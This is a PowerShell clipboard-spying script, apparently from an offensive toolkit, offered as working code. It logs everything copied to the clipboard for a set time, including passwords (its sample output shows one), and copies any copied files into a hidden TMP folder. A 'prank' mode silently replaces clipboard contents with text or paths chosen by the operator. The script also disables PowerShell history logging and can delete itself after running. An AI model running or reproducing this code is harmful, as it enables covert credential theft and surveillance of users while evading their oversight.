<#
.SYNOPSIS
   Capture clipboard text\file\image\audio

   Author: @r00t-3xp10it
   Tested Under: Windows 10 (19042) x64 bits
   Required Dependencies: Assembly PresentationCore {native}
   Optional Dependencies: none
   PS cmdlet Dev version: v2.2.11

.DESCRIPTION
   This module captures clipboard content everytime the clipboard its used!
   The clipboard is a section of RAM where your computer stores copied data.
   This can be a selection of text, an image, a file, or other type of data
   it is placed in the clipboard whenever you use the "Copy" (CTRL+C) command.  

.NOTES
   If sellected the parameter -Action 'capture' then this cmdlet starts
   capture clipboard for a specified amount of time defined by -CaptureTime
   If invoked -Forensic [switch] then this cmdlet will store files, images,
   audio files beeing passed to clipboard into '$Env:TMP\Forensic' directory!
   
.Parameter Action
   Accepts arguments: Enum, Capture, Prank (default: Enum)

.Parameter Logfile
   [Capture] The path where to store logfile (default: $Env:TMP\clipboard.log)

.Parameter CaptureTime
   [Capture] The amount of time in seconds to capture clipboard (default: 30)

.Parameter GetStrings
   [Capture] The interval in seconds for query clipboard contents (default: 1)

.Parameter DontFilter
   [Capture] Add duplicated strings captured to logfile? [SWITCH]
   
.Parameter Forensic
   [Capture] Store the documents beeing passed to the clipboard? [SWITCH]
   
.Parameter SetText
   [Prank] The text data to overwrite the clipboard with (default: Eureka)

.Parameter SetPath
   [Prank] The path to overwrite the clipboard with (default: $Env:WINDIR\System32\calc.exe)

.EXAMPLE
   PS C:\> Get-Help .\xclipboard.ps1 -full
   Access this cmdlet comment based help

.EXAMPLE
   PS C:\> .\xclipboard.ps1 -Action Enum
   Capture current clipboard text\file\image\audio!

.EXAMPLE
   PS C:\> .\xclipboard.ps1 -Action Capture -CaptureTime "10" -logfile "$Env:TMP\clip.log"
   Capture clipboard contents for 10 seconds total time into -Database '<string>' directory!
   
.EXAMPLE
   PS C:\> .\xclipboard.ps1 -Action Capture -CaptureTime "30" -Forensic
   Capture clipboard contents for 30 sec and Store files beeing passed to clipboard!
   Remark: This function creates 'Forensic' folder under %TMP% directory for storage!

.EXAMPLE
   PS C:\> .\xclipboard.ps1 -action capture -capturetime "20" -dontfilter
   Capture clipboard contents for 20 sec (Add duplicated strings to logfile)
   
.EXAMPLE
   PS C:\> .\xclipboard.ps1 -Action Prank -CaptureTime "15" -SetText "HACKED" -SetPath "$Env:TMP"
   Overwrite clipboard data for 15 seconds by -SetText '<string>' and -SetPath '<string>' values!
   Remark: This function set's the clipboard to our data every 2 sec until -CaptureTime its reached!

.INPUTS
   None. You cannot pipe objects into xclipboard.ps1

.OUTPUTS
   * Capture SKYNET clipboard for 30 seconds time!
     => logfile 'C:\Users\pedro\AppData\Local\Temp\clip.log'

        Operative System : Microsoft Windows 10 Home
        Start Date\Time  : 18/01/2023 [21:56:40]
        Process PID Id   : 1113

   [07:54:26]: whoami
   [07:54:28]: myS3cr3tpAss
   [07:54:30]: netstat -ano|findstr "ESTABLISHED"
   [07:54:32]: C:\Users\pedro\music\ironmaiden\eddie.mp4
   [07:54:34]: C:\Users\pedro\images\praiadasamoqueira.jpg
   [07:54:36]: C:\Users\pedro\Coding\redpill\bin\NoAmsi.ps1
   
.LINK
   https://github.com/r00t-3xp10it/redpill
   https://docs.microsoft.com/en-us/dotnet/api/system.windows.forms.clipboard
   https://gist.github.com/r00t-3xp10it/1843ade5ae4ac981e95007f9d4e607f1#gistcomment-3861483
#>


[CmdletBinding(PositionalBinding=$false)] param(
   [string]$SetPath="$Env:WINDIR\System32\calc.exe",
   [string]$Logfile="$Env:TMP\clipboard.log",
   [string]$SetText="Eureka",
   [string]$Action="Enum",
   [int]$CaptureTime='30',
   [int]$GetStrings='1',
   [switch]$DontFilter,
   [switch]$CleanUp,
   [switch]$Forensic
)


$ErrorActionPreference = "SilentlyContinue"
Add-Type -Assembly PresentationCore|Out-Null
## Disable Powershell Command Logging for current session.
Set-PSReadlineOption –HistorySaveStyle SaveNothing|Out-Null

#Cmdlet mandatory requirement tests!
If(-not(([appdomain]::currentdomain.GetAssemblies()).Location -iMatch '(PresentationCore.dll)$'))
{
   Write-Host "`nERROR: failed to Add-Assembly-Type 'PresentationCore'`n" -ForeGroundColor Red -BackGroundColor Black
   return #Exit @clipboard
}

If(-not($Action -iMatch '^(Enum|Capture|Prank)$'))
{
   Write-Host "`nERROR: Bad -Action '<string>' argument input!`n" -ForeGroundColor Red -BackGroundColor Black
   Start-Sleep -Seconds 3;Get-Help .\clipboard.ps1 -Detailed
   return #Exit @clipboard
}


$ForensicDirectory = "$Env:TMP\Forensic"
$StartD = (Get-Date -Format 'dd/MM/yyyy [HH:mm:ss]')
$System = (Get-CimInstance -ClassName CIM_OperatingSystem).Caption

If($Action -ieq "Enum")
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Display clipboard text\file\image\audio contents!
      
   .OUTPUTS
      * Display SKYNET current clipboard contents!
        => formats: cmdline, text, file, image, audio.
        
      [capture]: myS3cr3tpAss
   #>

   #Banner
   Write-Host "`n* Display $Env:COMPUTERNAME current clipboard contents!" -ForegroundColor Green
   Write-Host "  => formats: cmdline, text, file, image, audio.`n" -ForegroundColor DarkYellow

   #Display clipboard contents!
   If([Windows.Clipboard]::ContainsFileDropList())
   {
      Write-Output ("[capture]: "+[Windows.Clipboard]::GetFileDropList())
   }
   ElseIf([Windows.Clipboard]::ContainsText())
   {
      Write-Output ("[capture]: "+[Windows.Clipboard]::GetText().split("`n"))
   }
   ElseIf([Windows.Clipboard]::ContainsImage())
   {
      Write-Output ("[capture]: "+[Windows.Clipboard]::GetImage())
   }
   ElseIf([Windows.Clipboard]::ContainsAudio())
   {
      Write-Output ("[capture]: "+[Windows.Clipboard]::GetAudio())
   }
   Else
   {
      Write-Host "`nERROR: None clipboard contents found under $Env:COMPUTERNAME!" -ForegroundColor Red -BackgroundColor Black
   }

   Write-Host ""
}


If($Action -ieq "Capture")
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Helper - Capture clipboard for a specified amount of time!

   .NOTES
      If sellected -Forensic [SWITCH] @argument then cmdlet will
      store files, images, audio files beeing passed to clipboard
      into '$Env:TMP\Forensic' local directory for later review!
      
   .OUTPUTS
      * Capture SKYNET clipboard for 30 seconds time!
        => logfile 'C:\Users\pedro\AppData\Local\Temp\clipboard.log'
           => Forensic 'C:\Users\pedro\AppData\Local\Temp\Forensic'

        Operative System : Microsoft Windows 10 Home
        Start Date\Time  : 18/01/2023 [21:56:40]
        Process PID Id   : 1113

      [07:54:30]: whoami
      [07:54:32]: C:\Users\pedro\music\ironmaiden\eddie.mp4
      [07:54:34]: C:\Users\pedro\images\praiadasamoqueira.jpg
      [07:54:36]: C:\Users\pedro\Coding\redpill\bin\NoAmsi.ps1
   #>

   #Function internal Tests\Settings!
   If(Test-Path -Path "$logfile" -EA SilentlyContinue)
   {
      Remove-Item -Path "$logfile" -Force
   }
     
   #Banner displays
   Write-Host "`n* Capture $Env:COMPUTERNAME clipboard for $CaptureTime seconds" -ForegroundColor Green
   Write-Host "  => logfile '$logfile'" -ForegroundColor DarkYellow   

   If($Forensic.IsPresent)
   {
      Write-Host "     => Forensic '$ForensicDirectory'" -ForegroundColor DarkYellow
      If(Test-Path -Path "$ForensicDirectory" -EA SilentlyContinue)
      {
         Remove-Item -Path "$ForensicDirectory" -Recurse -Force
      }

      #Create 'Forensic' directory under %TMP% tree! {or user sellection}
      New-Item -ItemType directory -Path "$ForensicDirectory" -Force|Out-Null
   }   

   #Capture Time variable declarations!   
   $TimeOut = New-TimeSpan -Seconds $CaptureTime
   $StartTime = [diagnostics.stopwatch]::StartNew()

   #Building logfile header!
   echo "* Capture $Env:COMPUTERNAME clipboard for $CaptureTime seconds`n" > "$logfile"
   echo "Operative system : $System" >> "$logfile"
   echo "StartDate        : $StartD" >> "$logfile"
   echo "PID              : $PID`n" >> "$logfile"

   #Print onscreen
   write-host "`n  Operative System : $System"
   write-host "  Start Date\Time  : $StartD"
   write-host "  Process PID Id   : $PID`n"

   #Timed Loop function
   While($StartTime.elapsed -lt $TimeOut)
   {
      #Capture time!
      $CapTime = Get-Date -Format "HH:mm:ss"
      If([Windows.Clipboard]::ContainsFileDropList())
      {
         $RawOutput = [Windows.Clipboard]::GetFileDropList()
         $FinalOutput = "[$CapTime]:" + " $RawOutput" -join ''

         If($DontFilter.IsPresent)
         {
            ## Add duplicated entrys to logfile
            echo $FinalOutput >> "$logfile"
            write-host "$FinalOutput" -ForegroundColor Blue
         }
         Else
         {
            ## Do NOT add duplicated entrys to logfile.
            If($RawOutput -Match '\\'){$RawOutput = $RawOutput -replace '\\','\\'}
            $TEstFile = Get-Content -Path "$logfile"|Select-String -Pattern "($RawOutput)$"
            If([string]::IsNullOrEmpty($TEstFile))
            {
               echo $FinalOutput >> "$logfile"
               write-host "$FinalOutput" -ForegroundColor Blue
            }
         }
         
         If($Forensic.IsPresent)
         {
            #Copy clipboard items to 'Forensic' folder!
            Copy-Item -Path "$RawOutput" -Destination "$ForensicDirectory" -Force
         }
      }
      ElseIf([Windows.Clipboard]::ContainsText())
      {
         $RawOutput = [Windows.Clipboard]::GetText().split("`n")
         $FinalOutput = "[$CapTime]:" + " $RawOutput" -join ''

         If($DontFilter.IsPresent)
         {
            ## Add duplicated entrys to logfile
            echo $FinalOutput >> "$logfile"
            write-host "$FinalOutput" -ForegroundColor Blue         
         }
         Else
         {
            ## Do NOT add duplicated entrys to logfile.
            If($RawOutput -Match '\\'){$RawOutput = $RawOutput -replace '\\','\\'}
            $TEstFile = Get-Content -Path "$logfile"|Select-String -Pattern "($RawOutput)$"
            If([string]::IsNullOrEmpty($TEstFile))
            {
               echo $FinalOutput >> "$logfile"
               write-host "$FinalOutput" -ForegroundColor Blue
            }
         }
      }
      ElseIf([Windows.Clipboard]::ContainsImage())
      {
         $RawOutput = [Windows.Clipboard]::GetImage()
         $FinalOutput = "[$CapTime]:" + " $RawOutput" -join ''

         If($DontFilter.IsPresent)
         {
            ## Add duplicated entrys to logfile
            echo $FinalOutput >> "$logfile"
            write-host "$FinalOutput" -ForegroundColor Blue        
         }
         Else
         {
            ## Do NOT add duplicated entrys to logfile.
            If($RawOutput -Match '\\'){$RawOutput = $RawOutput -replace '\\','\\'}
            $TEstFile = Get-Content -Path "$logfile"|Select-String -Pattern "($RawOutput)$"
            If([string]::IsNullOrEmpty($TEstFile))
            {
               echo $FinalOutput >> "$logfile"
               write-host "$FinalOutput" -ForegroundColor Blue
            }
         }
         
         If($Forensic.IsPresent)
         {
            #Copy clipboard items to 'Forensic' folder!
            Copy-Item -Path "$RawOutput" -Destination "$ForensicDirectory" -Force
         }        
      }
      ElseIf([Windows.Clipboard]::ContainsAudio())
      {
         $RawOutput = [Windows.Clipboard]::GetAudio()
         $FinalOutput = "[$CapTime]:" + " $RawOutput" -join ''

         If($DontFilter.IsPresent)
         {
            ## Add duplicated entrys to logfile
            echo $FinalOutput >> "$logfile"
            write-host "$FinalOutput" -ForegroundColor Blue
         }
         Else
         {
            ## Do NOT add duplicated entrys to logfile.
            If($RawOutput -Match '\\'){$RawOutput = $RawOutput -replace '\\','\\'}
            $TEstFile = Get-Content -Path "$logfile"|Select-String -Pattern "($RawOutput)$"
            If([string]::IsNullOrEmpty($TEstFile))
            {
               echo $FinalOutput >> "$logfile"
               write-host "$FinalOutput" -ForegroundColor Blue
            }
         }

         If($Forensic.IsPresent)
         {
            #Copy clipboard items to 'Forensic' folder!
            Copy-Item -Path "$RawOutput" -Destination "$ForensicDirectory" -Force
         }         
      }

      #Delay time to get-clipboard!
      Start-Sleep -Seconds $GetStrings
    }


    <#
    .NOTES
       Helper - Final configurations\cleannings!
    #>

    If($Forensic.IsPresent)
    {
       If(Test-Path -Path "$logfile" -EA SilentlyContinue)
       {
          #Move logfile to forensic folder {Text format capture}
          Move-Item -Path "$logfile" -Destination "$ForensicDirectory" -Force
       }
    }

    Write-Host ""
}


If($Action -ieq "Prank")
{

   <#
   .SYNOPSIS
      Author: @r00t-3xp10it
      Credits: @youhacker55
      Helper - Overwrite clipboard data by our own data!
      
   .NOTES
      This function loops for a sellected amount of time and set's
      the clipboard to our data every 2 seconds time (default). This
      means that everytime target user COPY's a file to clipboard that
      it will be overwritten by our own data when PASTE'ing later ..
      
   .OUTPUTS
      * [PRANK] Overwrite clipboard text\path's for 30 sec time!
        => SetPath 'C:\Users\pedro\AppData\Local\Temp'
           => SetText 'I DONT FUCKING CARE ..'

        Operative System : Microsoft Windows 10 Home
        Start Date\Time  : 18/01/2023 [21:56:40]
        Process PID Id   : 1113
        
      [07:54:30]: whoami
      [07:54:32]: I DONT FUCKING CARE ..
      [07:54:34]: C:\Users\pedro\music\ironmaiden\eddie.mp4
      [07:54:36]: C:\Users\pedro\AppData\Local\Temp
   #>
   
   #Banner displays
   Write-Host "`n* [" -ForegroundColor Green -NoNewline
   Write-Host "PRANK" -NoNewline
   Write-Host "] Overwrite clipboard text\path's for $CaptureTime seconds" -ForegroundColor Green
   Write-Host "  => SetPath: $SetPath" -ForegroundColor DarkYellow
   Write-Host "     => SetText: $SetText" -ForegroundColor DarkYellow

   #Print onscreen
   write-host "`n  Operative System : $System"
   write-host "  Start Date\Time  : $StartD"
   write-host "  Process PID Id   : $PID`n"

   #Capture Time variable declarations!   
   $TimeOut = New-TimeSpan -Seconds $CaptureTime
   $StartTime = [diagnostics.stopwatch]::StartNew()

   #Timed Loop function
   While($StartTime.elapsed -lt $TimeOut)
   {
      #Capture time!
      $CapTime = Get-Date -Format "HH:mm:ss"
      If([Windows.Clipboard]::ContainsFileDropList())
      {
         $RawOutput = [Windows.Clipboard]::GetFileDropList()
         $FinalOutput = "[$CapTime]:" + " $RawOutput" -join ''

         #Print OnScreen
         echo $FinalOutput

         If($RawOutput -ne "$SetPath")
         {
            #Substitute clipboard string
            [Windows.Clipboard]::SetFileDropList("$SetPath")
         }
      }
      ElseIf([Windows.Clipboard]::ContainsText())
      {
         $RawOutput = [Windows.Clipboard]::GetText().split("`n")
         $FinalOutput = "[$CapTime]:" + " $RawOutput" -join ''

         #Print OnScreen
         echo $FinalOutput

         If($RawOutput -ne "$SetText")
         {
            #Substitute clipboard string
            [Windows.Clipboard]::SetText("$SetText")
         }
      }
      ElseIf([Windows.Clipboard]::ContainsImage())
      {
         $RawOutput = [Windows.Clipboard]::GetImage()
         $FinalOutput = "[$CapTime]:" + " $RawOutput" -join ''

         #Print OnScreen
         echo $FinalOutput
         
         If($RawOutput -ne "$SetPath")
         {
            #Substitute clipboard string
            [Windows.Clipboard]::SetImage("$SetPath")
         }       
      }
      ElseIf([Windows.Clipboard]::ContainsAudio())
      {
         $RawOutput = [Windows.Clipboard]::GetAudio()
         $FinalOutput = "[$CapTime]:" + " $RawOutput" -join ''

         #Print OnScreen
         echo $FinalOutput
         
         If($RawOutput -ne "$SetPath")
         {
            #Substitute clipboard string
            [Windows.Clipboard]::SetAudio("$SetPath")
         }         
      }

      #Delay time to get-clipboard!
      Start-Sleep -Milliseconds 500
    }

    #Reset clipboard at exit!
    [Windows.Clipboard]::Clear()
    Write-Host ""

}

If($CleanUp.IsPresent)
{
   Remove-Item -Path $MyInvocation.MyCommand.Source
}